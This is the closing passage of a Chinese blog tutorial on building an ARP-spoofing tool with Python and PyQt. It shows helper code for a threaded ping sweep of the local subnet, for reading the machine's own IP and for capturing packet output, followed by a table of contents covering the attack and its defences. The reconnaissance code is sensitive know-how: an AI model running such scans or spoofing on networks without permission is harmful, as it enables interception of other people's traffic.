+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ip_prefix = <span class="string">&#x27;.&#x27;</span>.join(gateway_ip.split(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    ip = <span class="string">&#x27;%s.%s&#x27;</span> % (ip_prefix, i)</span><br><span class="line">    threads.append(threading.Thread(target=ping_ip, args=&#123;ip, &#125;))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_ip</span>(<span class="params">ip_str</span>):</span></span><br><span class="line">    cmd = [<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>, ip_str]</span><br><span class="line">    output = os.popen(<span class="string">&quot; &quot;</span>.join(cmd)).readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(line).upper().find(<span class="string">&quot;TTL&quot;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ip: %s 在线&quot;</span> % ip_str)</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="2-获取本IP"   >
+          <a href="#2-获取本IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-获取本IP" class="headerlink" title="(2)获取本IP"></a>(2)获取本IP</h3>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_self_ip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> netD_name</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="keyword">return</span> socket.inet_ntoa(fcntl.ioctl(s.fileno(), <span class="number">0x8915</span>, struct.pack(<span class="string">&#x27;256s&#x27;</span>, <span class="built_in">bytes</span>(netD_name[:<span class="number">15</span>],<span class="string">&#x27;utf-8&#x27;</span>)))[<span class="number">20</span>:<span class="number">24</span>])</span><br><span class="line">self_ip = get_self_ip()</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="3-从stdout获取输出"   >
+          <a href="#3-从stdout获取输出" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-从stdout获取输出" class="headerlink" title="(3)从stdout获取输出"></a>(3)从stdout获取输出</h3>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conten_from_stdout</span>(<span class="params">self,func</span>):</span></span><br><span class="line">    sys.stdout = string_io = StringIO()</span><br><span class="line">    func()</span><br><span class="line">    sys.stdout = self._stdout</span><br><span class="line">    print_str = string_io.getvalue()</span><br><span class="line">    <span class="keyword">del</span> string_io</span><br><span class="line">    <span class="keyword">return</span> print_str</span><br><span class="line"></span><br><span class="line">print_str = self.get_conten_from_stdout(pkt.show)</span><br></pre></td></tr></table></div></figure>
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/03/07/arp_spoof/">http://pig-007.github.io/2022/03/07/arp_spoof/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/arp-spoof/">arp_spoof</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2022/02/10/PHP_PWN/"><span class="paginator-prev__text">PHP_PWN</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-text">
+          一、原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%94%BB%E5%87%BB"><span class="toc-text">
+          1.攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%AC%BA%E9%AA%97%E5%8F%97%E5%AE%B3%E8%80%85"><span class="toc-text">
+          (1)欺骗受害者</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%AC%BA%E9%AA%97%E7%BD%91%E5%85%B3"><span class="toc-text">
+          (2)欺骗网关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%AC%BA%E9%AA%97%E6%89%80%E6%9C%89%E4%BA%BA"><span class="toc-text">
+          (3)欺骗所有人</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%98%B2%E5%BE%A1"><span class="toc-text">
+          2.防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A3%80%E6%B5%8B"><span class="toc-text">
+          (1)检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0rep%E6%A8%A1%E5%BC%8F"><span class="toc-text">
+          ①rep模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1req%E6%A8%A1%E5%BC%8F"><span class="toc-text">
+          ②req模式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%AE%9E%E9%99%85%E9%98%B2%E5%BE%A1"><span class="toc-text">
+          (2)实际防御</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0rep%E6%A8%A1%E5%BC%8F-1"><span class="toc-text">
+          ①rep模式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1req%E6%A8%A1%E5%BC%8F-1"><span class="toc-text">
+          ②req模式</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81pyQt%E7%95%8C%E9%9D%A2"><span class="toc-text">
+          二、pyQt界面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">
+          1.环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%85%8D%E5%90%88pycharm"><span class="toc-text">
+          2.配合pycharm</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Qt-Designer"><span class="toc-text">
+          Qt_Designer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UI%E8%BD%ACpy"><span class="toc-text">
+          UI转py</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E7%95%8C%E9%9D%A2%E5%90%AF%E5%8A%A8"><span class="toc-text">
+          3.界面启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E7%95%8C%E9%9D%A2%E9%80%80%E5%87%BA"><span class="toc-text">
+          4.界面退出</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-text">
+          三、利用函数详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8F%91%E5%8C%85%E5%87%BD%E6%95%B0"><span class="toc-text">
+          1.发包函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Ether"><span class="toc-text">
+          (1)Ether</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ARP"><span class="toc-text">
+          (2)ARP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%AE%9E%E9%99%85%E5%8F%91%E5%8C%85"><span class="toc-text">
+          (3)实际发包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0send"><span class="toc-text">
+          ①send</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1sendp"><span class="toc-text">
+          ②sendp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E7%BA%BF%E7%A8%8B%E5%87%BD%E6%95%B0"><span class="toc-text">
+          2.线程函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BA%BF%E7%A8%8B%E5%90%AF%E5%8A%A8"><span class="toc-text">
+          (1)线程启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E7%BA%BF%E7%A8%8B%E9%98%BB%E5%A1%9E"><span class="toc-text">
+          (2)线程阻塞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%BA%BF%E7%A8%8B%E7%BB%88%E6%AD%A2"><span class="toc-text">
+          (3)线程终止</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%85%B6%E4%BB%96%E5%8A%9F%E8%83%BD%E6%80%A7%E5%87%BD%E6%95%B0"><span class="toc-text">
+          3.其他功能性函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%8E%B7%E5%8F%96%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E5%87%BD%E6%95%B0"><span class="toc-text">
+          (1)获取存活主机函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E6%9C%ACIP"><span class="toc-text">
+          (2)获取本IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E4%BB%8Estdout%E8%8E%B7%E5%8F%96%E8%BE%93%E5%87%BA"><span class="toc-text">
+          (3)从stdout获取输出</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsauthor.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">The way forward</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">115</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">58</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">57</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PIG-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', 'Please enter characters');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"/live2dw/assets/assets/wanko.model.json"},"display":{"superSample":2,"width":150,"height":300,"position":"left","hOffset":0,"vOffset":-80},"mobile":{"show":true,"scale":0.5},"react":{"opacityDefault":0.7,"opacityOnHover":0.8},"log":false});</script></body></html>
